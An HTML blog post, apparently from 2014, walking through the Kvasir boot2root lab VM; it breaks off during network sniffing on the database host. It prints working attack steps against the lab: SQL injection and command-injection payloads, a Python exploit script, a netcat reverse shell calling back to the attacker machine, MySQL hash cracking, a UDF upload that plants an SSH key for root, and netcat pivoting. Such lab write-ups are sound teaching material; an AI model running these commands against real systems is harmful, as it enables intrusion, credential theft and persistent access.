@@ -1,0 +1,1528 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>solving kvasir - netcat edition &middot; </title>
+
+  
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="http://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="http://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>solving kvasir - netcat edition</h1>
+    <span class="post-date">Nov 9, 2014 &middot; 43 minute read &middot; <a href="http://leonjza.github.io/2014/11/09/solving-kvasir-netcat-edition/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="http://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="http://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="http://leonjza.github.io/categories/solution">Solution</a><a class="label" href="http://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="http://leonjza.github.io/categories/vulnhub">VulnHub</a>
+    </span>
+    <p>##introduction
+<a href="http://vulnhub.com/entry/kvasir-i,106/">Kvasir</a>, a boot2root by <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!</p>
+
+<p>{% img right <a href="https://i.imgur.com/gHw2Q50.gif">https://i.imgur.com/gHw2Q50.gif</a> %} Kvasir is <em>extremely</em> well polished, and it can be seen throughout the VM that <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.</p>
+
+<p>This writeup details the path I took to read the final flag :)</p>
+
+<p>##a usual start
+Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using <code>proxychains</code>, and I was editing <code>/etc/proxychains.conf</code> to match the port of the proxy I needed to use to reach my desired destination.</p>
+
+<p>With that out the way, lets start.<br />
+Almost all of the boot2roots have a discovery phase. After downloading the archive from <a href="http://vulnhub.com">vulnhub.com</a>, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged *lazy mode*™ and checked what the VirtualBox session showed the IP was:</p>
+
+<p>{% img <a href="https://i.imgur.com/ZTj0D3h.png">https://i.imgur.com/ZTj0D3h.png</a> %}</p>
+
+<p><strong>192.168.56.102</strong>. Sweet, throwing <code>nmap</code> at it showed only <code>tcp/80</code> as open.</p>
+
+<pre><code class="language-bash">root@kali:~# nmap 192.168.56.102
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 11:07 SAST
+Nmap scan report for 192.168.56.102
+Host is up (0.000061s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+</code></pre>
+
+<p>##fink ur gud enuf?
+Browsing to the IP using Iceweasel, we see a login portal presented to us:</p>
+
+<p>{% img <a href="https://i.imgur.com/vUSSRt7.png">https://i.imgur.com/vUSSRt7.png</a> %}</p>
+
+<p>I made a few attempts at guessing a login, and eventually just threw a <code>'</code> at the username field:</p>
+
+<p>{% img <a href="https://i.imgur.com/gVb0iK7.png">https://i.imgur.com/gVb0iK7.png</a> %}</p>
+
+<p>I had a instant troll alert and figured it can&rsquo;t be <em>that</em> easy!? Changing the username payload from <code>'</code> to <code>' OR 1=1 LIMIT 1--</code> with a random word as a password, resulted in the application returning a <code>403</code> type response. I figured that something strange was going on here, and fired up <a href="http://portswigger.net/burp/">Burp Suite</a> to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:</p>
+
+<p>{% img <a href="https://i.imgur.com/mAxhkaG.png">https://i.imgur.com/mAxhkaG.png</a> %}</p>
+
+<p>Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered <code>bob:bob</code> with a DoB of <code>09/09/09</code>, and attempted to login with the credentials:</p>
+
+<p>{% img <a href="https://i.imgur.com/o9Utreq.png">https://i.imgur.com/o9Utreq.png</a> %}</p>
+
+<p>Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as <code>'a', 'a', 0, NULL)</code>. Considering this was a new account registration page, my guess was that this was part of a <code>INSERT</code> query:</p>
+
+<p>{% img <a href="https://i.imgur.com/DA1Xe5H.png">https://i.imgur.com/DA1Xe5H.png</a> %}</p>
+
+<p>It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &lsquo;ol <code>wfuzz</code> on the web service to see if there was anything interesting to reveal:</p>
+
+<pre><code class="language-bash">root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php
+
+********************************************************
+* Wfuzz  2.0 - The Web Bruteforcer                     *
+********************************************************
+
+Target: http://192.168.56.102/FUZZ.php
+Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
+
+Total requests: 1660
+==================================================================
+ID  Response   Lines      Word         Chars          Request    
+==================================================================
+
+00077:  C=302     16 L        34 W      365 Ch    &quot; - admin&quot;
+00302:  C=403     10 L        30 W      294 Ch    &quot; - cgi-bin/&quot;
+00394:  C=403     10 L        30 W      292 Ch    &quot; - create&quot;
+00455:  C=403     10 L        30 W      294 Ch    &quot; - descarga&quot;
+00457:  C=403     10 L        30 W      296 Ch    &quot; - descarrega&quot;
+00463:  C=403     10 L        30 W      298 Ch    &quot; - descarregues&quot;
+00741:  C=200     20 L        44 W      464 Ch    &quot; - index&quot;
+00894:  C=403     10 L        30 W      290 Ch    &quot; - load&quot;
+00901:  C=302      0 L         0 W        0 Ch    &quot; - login&quot;
+00904:  C=302      0 L         0 W        0 Ch    &quot; - logout&quot;
+00964:  C=302     15 L        16 W      168 Ch    &quot; - member&quot;
+01247:  C=200     17 L        39 W      426 Ch    &quot; - register&quot;
+01331:  C=403     10 L        30 W      292 Ch    &quot; - select&quot;
+01432:  C=200      0 L         0 W        0 Ch    &quot; - submit&quot;
+01556:  C=403     10 L        30 W      292 Ch    &quot; - update&quot;
+01565:  C=403     10 L        30 W      293 Ch    &quot; - updates&quot;
+</code></pre>
+
+<p>Woa, thats quite a bit of results to work through eh :)</p>
+
+<p>##admins only want to 302 here
+Of everything <code>wfuzz</code> revealed to us, <code>admin.php</code> was the most interesting one. Watching Burp as the requests went up and down, I noticed that <code>admin.php</code> would return a HTTP 302 code with a location, along with an actual body:</p>
+
+<p>{% img <a href="https://i.imgur.com/exdmq5A.png">https://i.imgur.com/exdmq5A.png</a> %}</p>
+
+<p>Sweet! I modified the response in Burp to return <code>200</code> instead, and removed the <code>Location:</code> header. We now had a new page to work with :)</p>
+
+<p>{% img <a href="https://i.imgur.com/6WoT1x2.png">https://i.imgur.com/6WoT1x2.png</a> %}</p>
+
+<p>The form hints that we can check the service status of daemons running on the underlying OS, and suggests <code>apache2</code> as input. I submitted the form with <code>apache2</code> as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section <code>Apache2 is running (pid 1330).</code>. This just <strong>screams</strong> command injection doesn’t it?</p>
+
+<p>##command injection
+In order for me to fuzz this further, I took the request to trusty &lsquo;ol <code>curl</code>. While doing this, I realized that <code>admin.php</code> did no checks to ensure that we are authenticated or anything. We could simply submit <code>service=&lt;payload&gt;</code> as a POST to <code>admin.php</code> and get output:</p>
+
+<pre><code class="language-bash">root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=apache2;'
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;div align=&quot;center&quot;&gt;
+
+&lt;h1&gt;Service Check&lt;/h1&gt;
+
+&lt;form name=&quot;service&quot; method=&quot;post&quot; action=&quot;&quot;&gt;
+&lt;input name=&quot;service&quot; id=&quot;service&quot; type=&quot;text&quot; placeholder=&quot;apache2&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+&lt;/form&gt;
+
+&lt;form action=&quot;logout.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Logout&quot; /&gt;
+&lt;/form&gt;
+
+&lt;pre&gt;Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
+&lt;/pre&gt;
+</code></pre>
+
+<p>Entering <code>apache2;</code> as the input, revealed the first step in our command injection. With <code>apache2;</code> as the payload, I figured that the php script was taking our user input and running with the following pseudo code:</p>
+
+<pre><code class="language-php">&lt;?php
+
+print system(&quot;/etc/init.d/&quot; . $_POST[&quot;service&quot;] . &quot; status&quot;);
+</code></pre>
+
+<p>So, with our payload, we have modified this to run <code>/etc/init.d/apache2; status</code>, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting <code>service=</code> as <code>;echo 'id';</code> where the single quotes are actually back ticks. (octopress grrr)</p>
+
+<pre><code class="language-bash">root@kali:~# curl 'http://192.168.56.102/admin.php' --data 'service=;echo `id`;'
+
+[... snip ...]
+
+&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/pre&gt;
+</code></pre>
+
+<p>##netcat is our entry into the rabbit hole
+With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&rsquo;d out. This ended up as the following python script:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+# Kvasir Command Execution
+
+# $ python cmd.py &quot;uname -a&quot;
+# Command to run: uname -a
+# 
+# Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux
+
+import requests
+import re
+import sys
+import os
+import binascii
+
+print 'Command to run: %s' % sys.argv[1]
+
+# generate 2 random strings so that we can regex out the command output
+command_start = binascii.b2a_hex(os.urandom(30))
+command_end = binascii.b2a_hex(os.urandom(30))
+
+# prepare something that we can regex out
+params = {'service' : ';echo %s; echo `%s`; echo %s;' % (command_start, sys.argv[1], command_end) }
+
+#fetch, ignoring the troll redirect
+r = requests.post('http://192.168.56.102/admin.php', params, allow_redirects=False)
+
+#match regex and print
+print  re.findall(r'%s([^|]+)%s' % (command_start, command_end), r.text)[0].replace('\n%s\n' % command_end,'')
+</code></pre>
+
+<p>So, now I can just run <code>python cmd.py &quot;id&quot;</code> and get the output (the <em>(kvasir)</em> in front of my prompt is my python virtualenv where I installed the <code>requests</code> dependency):</p>
+
+<pre><code class="language-bash">(kvasir)root@kali:~# python cmd.py &quot;id&quot;
+Command to run: id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. <strong>192.168.1.100</strong> and <strong>192.168.2.100</strong>. No sign of <strong>192.168.56.102</strong> here&hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with <code>nc -lvp 4444</code>, and connected to it using my <code>cmd.py</code> script <code>python cmd.py &quot;/bin/nc 192.168.56.101 4444 -e /bin/bash&quot;</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# nc -lvp 4444 
+listening on [any] 4444 ...
+192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+
+<p>So, in order to make sure we don&rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host <code>web</code>:</p>
+
+<p>{% img <a href="https://i.imgur.com/Q2rSi2G.png">https://i.imgur.com/Q2rSi2G.png</a> %}</p>
+
+<p>The only public presence of the internal network is therefore the originally discovered <strong>192.168.56.102</strong> IP address.</p>
+
+<p>##my-see-qual as root deserves a slap on the wrist
+With semi interactive shell access using <code>netcat</code> to <strong>web</strong> (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from <code>member.php</code>:</p>
+
+<pre><code class="language-php">&lt;?php
+
+session_start();
+
+if (!isset($_SESSION[&quot;member&quot;])) {
+    header(&quot;Location: index.php&quot;);
+}
+
+$user = $_SESSION[&quot;username&quot;];
+
+mysql_connect(&quot;192.168.2.200&quot;, &quot;webapp&quot;, &quot;webapp&quot;) or die(mysql_error());
+mysql_select_db(&quot;webapp&quot;) or die(mysql_error());
+
+$query = &quot;SELECT dob FROM users WHERE username='$user'&quot;;
+$result = mysql_query($query) or die(mysql_error());
+
+?&gt;
+[... snip ...]
+</code></pre>
+
+<p>So mysql access with <code>webapp:webapp</code> at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:</p>
+
+<pre><code class="language-bash">mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'show grants;'
+Grants for webapp@192.168.2.100
+GRANT SELECT, INSERT ON *.* TO 'webapp'@'192.168.2.100' IDENTIFIED BY PASSWORD '*BF7C27E734F86F28A9386E9759D238AFB863BDE3'
+GRANT ALL PRIVILEGES ON `webapp`.* TO 'webapp'@'192.168.2.100'
+</code></pre>
+
+<p>So I can select anywhere. Nice :)</p>
+
+<pre><code class="language-bash">mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; show tables;'
+Tables_in_webapp
+todo
+users
+mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use webapp; select * from todo;'
+task
+stop running mysql as root
+</code></pre>
+
+<p>A table called <code>todo</code> exists, with a string <code>stop running mysql as root</code>. That was the first hint and immediately had me thinking about <a href="http://www.mysqludf.org/">MySQL UDF</a>&rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:</p>
+
+<pre><code class="language-bash">mysql -uwebapp -pwebapp -h 192.168.2.200 -e 'use mysql; select DISTINCT User,Password from user;'
+User    Password
+root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
+debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
+webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
+</code></pre>
+
+<p>As a side note, further enumeration of the PHP sources and MySQL table <code>users</code> showed that if we injected SQL on the registration page to add a extra <code>1</code>, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.</p>
+
+<p>###cracking root&rsquo;s MySQL password
+Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used <code>hashcat</code> with the ever famous <code>rockyou</code> wordlist:</p>
+
+<pre><code class="language-bash"># first, echo the hash to a file
+root@kali:~# echo &quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&quot; &gt; db.root
+
+# next, we tell hash cat the type of hash we have and wait a few seconds :)
+root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt 
+This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.
+
+Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
+
+Added hashes from file db.root: 1 (1 salts)
+Activating quick-digest mode for single-hash
+
+NOTE: press enter for status-screen
+
+ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater
+
+All hashes have been recovered
+
+Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
+Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
+Recovered.: 1/1 hashes, 1/1 salts
+Speed/sec.: - plains, 3.27M words
+Progress..: 281260/3627099 (7.75%)
+Running...: --:--:--:--
+Estimated.: 00:00:00:01
+
+Started: Sun Nov  9 14:07:14 2014
+Stopped: Sun Nov  9 14:07:14 2014
+</code></pre>
+
+<p>The password for the MySQL <code>root</code> user is therefore <code>coolwater</code>:</p>
+
+<pre><code class="language-bash">mysql -uroot -pcoolwater -h 192.168.2.200 -e 'show grants;'
+Grants for root@192.168.2.100
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.2.100' IDENTIFIED BY PASSWORD '*ECB01D78C2FBEE997EDA584C647183FD99C115FD' WITH GRANT OPTION
+</code></pre>
+
+<p>###loading the UDF remotely
+With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.</p>
+
+<p>I grabbed a copy of a <code>do_system()</code> UDF that I have previously used successfully from <a href="http://www.0xdeadbeef.info/exploits/raptor_udf.c">here</a>, called <code>raptor_udf.c</code>. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the <code>web</code> host. Compilation was done on the <code>web</code> host with:</p>
+
+<pre><code class="language-bash">gcc -g -c raptor_udf.c -fPIC
+gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
+</code></pre>
+
+<p>This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word <code>uploading</code> sounds trivial, however its not. I need to know <em>where</em> to first. For this, I enumerate the MySQL <code>plugin_dir</code>:</p>
+
+<pre><code class="language-bash">mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select @@plugin_dir;'
+@@plugin_dir
+/usr/lib/mysql/plugin/
+</code></pre>
+
+<p>So this means I need to write the udf to <code>/usr/lib/mysql/plugin/raptor_udf.so</code>. Fair enough. But how do I write this? Well there are many approaches to this. One is to use <code>--local-infile=1</code> as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the <strong>local</strong> file to wherever (a table in our case) and then to a file via <code>INTO DUMPFILE</code>. The other option is to simply convert the content to hex, and run <code>SELECT 0x</code> + <code>&lt;CONTENT AS HEX&gt;</code> + <code>INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so</code>.</p>
+
+<p>I opted for the content encoding as hex and generated a <code>xxd</code> output of the compiled <code>raptor_udf.so</code>. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of <code>Undefined Symbol &quot;do_system&quot; in raptor_udf.so</code>. :</p>
+
+<p>Eventually, I opted to find a precompiled 64bit <code>.so</code> to upload, and found one in the <a href="https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so">sqlmap repository</a>. I downloaded this and converted it to hex using <code>xxd</code>. I then created the following file with the mysql commands to run on the <code>web</code> host from my attacking machine:</p>
+
+<pre><code class="language-bash">root@kali:~# cat load_udf.sh
+touch log
+mysql -uroot -pcoolwater -h 192.168.2.200 -e 'use mysql; select 0x7f454
+
+    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]
+
+0000000000000 into dumpfile &quot;/usr/lib/mysql/plugin/raptor_udf.so&quot;;' 2&gt;&gt; log
+mysql -uroot -pcoolwater -h 192.168.2.200 -e 'create function sys_exec returns integer soname &quot;raptor_udf.so&quot;;' 2&gt;&gt; log
+mysql -uroot -pcoolwater -h 192.168.2.200 -e 'use mysql; select * from mysql.func;' 2&gt;&gt; log
+
+# this adds me a SSH key to roots authorized keys using the command execution udf we have prepared
+mysql -uroot -pcoolwater -h 192.168.2.200 -e 'select sys_exec(&quot;echo \&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&quot; &gt; /root/.ssh/authorized_keys&quot;)' 2&gt;&gt; log
+</code></pre>
+
+<p>With this file ready, I opened a netcat port to pipe it to, and read it on <code>web</code>:</p>
+
+<pre><code class="language-bash"># on the attacking machine, I opened netcat with my mysql commands
+root@kali:~# nc -lvp 4444 &lt; load_udf.sh 
+listening on [any] 4444 ...
+
+# then on the original netcat shell I have, read it
+timeout 3 nc 192.168.56.101 4444 | sh
+name    ret dl  type
+sys_exec    2   raptor_udf.so   function
+sys_exec(&quot;echo \&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
+0
+</code></pre>
+
+<p>The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of <code>0</code>, indicating that it was successful. I specify the <code>timeout</code> command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)</p>
+
+<p>##ssh to db host
+With all that done, I have my public key for the <code>root</code> user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I <em>get</em> to 192.168.2.200&rsquo;s port 22? :)</p>
+
+<p>For that, I decided to look at <code>netcat</code> port forwarding! But first, lets read some man pages:</p>
+
+<pre><code class="language-bash">#from nc(1)
+OPTIONS
+       -c string    specify shell commands to exec after connect (use with caution).
+</code></pre>
+
+<p><em>&ldquo;use with caution&rdquo;</em>. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!</p>
+
+<p>{% img <a href="https://i.imgur.com/7IggbMC.jpg">https://i.imgur.com/7IggbMC.jpg</a> %}</p>
+
+<p>Lets see this in action. First I setup the initial listener on the attacking machine:</p>
+
+<pre><code class="language-bash"># listen on tcp/4444, re-listening on tcp/222 on a new connection
+root@kali:~# nc -lvp 4444 -c &quot;nc -lvp 222&quot;
+listening on [any] 4444 ...
+</code></pre>
+
+<p>With the listener setup, lets issue a new <code>nc</code> command in the initial shell that I got on <code>web</code>, connecting the dots:</p>
+
+<pre><code class="language-bash">nc 192.168.56.101 4444 -c &quot;nc 192.168.2.200 22&quot;
+</code></pre>
+
+<p>When this runs, the initial listener will see the new connection, and I should have the <code>tcp/22</code> of <strong>192.168.2.200</strong> now forwarded locally:</p>
+
+<pre><code class="language-bash">root@kali:~# nc -lvp 4444 -c &quot;nc -lvp 222&quot;
+listening on [any] 4444 ...
+
+# connection comes in from 192.168.1.100
+192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
+listening on [any] 222 ...
+</code></pre>
+
+<p>Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:</p>
+
+<p>{% img <a href="https://i.imgur.com/A2463Kc.png">https://i.imgur.com/A2463Kc.png</a> %}</p>
+
+<p>Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:</p>
+
+<pre><code class="language-bash">root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
+Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
+root@db:~# 
+</code></pre>
+
+<p>I added the <code>-D</code> option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a <em>almost</em> <em>direct</em> connection to the <code>db</code> (192.168.2.200) host, as denoted in green below:</p>
+
+<p>{% img <a href="https://i.imgur.com/wHNJJ5g.png">https://i.imgur.com/wHNJJ5g.png</a> %}</p>
+
+<p>8-)</p>
+
+<p>##not exactly nsa level spying but heh
+Initial enumeration revealed that this host (<code>db</code>) had 2 network interfaces. One with IP <strong>192.168.2.200</strong> (the one I came in from), and another with IP <strong>192.168.3.200</strong>. There were also 2 entries in <code>/etc/hosts</code> about 2 hosts in the 3.x network:</p>
+
+<pre><code class="language-bash">root@db:~# cat /etc/hosts
+# 192.168.3.40  celes
+# 192.168.3.50  terra
+
+[... snip ...]
+</code></pre>
+
+<p>The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:</p>
+
+<pre><code class="language-bash">root@db:~# ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 Nov08 ?        00:00:00 init [3]  
+root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
+root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
+root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
+root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
+root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
+root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER) 
+[... snip ...]
+</code></pre>
+
+<p>A interesting file was in <code>/root/.words.txt</code>, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.</p>
+
+<pre><code class="language-bash">root@db:~# head /root/.words.txt 
+borne
+precombatting
+noncandescent
+cushat
+lushness
+precensure
+romishness
+nonderivable
+overqualification
+superkojiman
+</code></pre>
+
+<p>And finally, a troll flag :D</p>
+
+<pre><code class="language-bash">root@db:~# cat /root/flag 
+This is not the flag you're looking for... :p
+</code></pre>
+
+<p>This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user <code>celes</code> in <code>/etc/pure-ftpd/pureftpd.passwd</code>, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.</p>
+
+<p>At one stage, I was checking to see what network activity was present on the interfaces, of which <code>eth0</code> had my SSH session, and <code>eth1</code> was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:</p>
+
+<pre><code class="language-bash">root@db:~# tcpdump -i eth1
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
+13:19:01.355970 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
+13:19:01.355988 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0
+
+[... snip ...]
+
+13:19:01.378604 IP 192.168.3.200.ftp &gt; 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
+13:19:01.378631 IP 192.168.3.40.36425 &gt; 192.168.3.200.ftp: Flags [R], seq 2471029587, win 0, length 0
+^C
+29 packets captured
+29 packets received by filter
+0 packets dropped by kernel
+</code></pre>
+
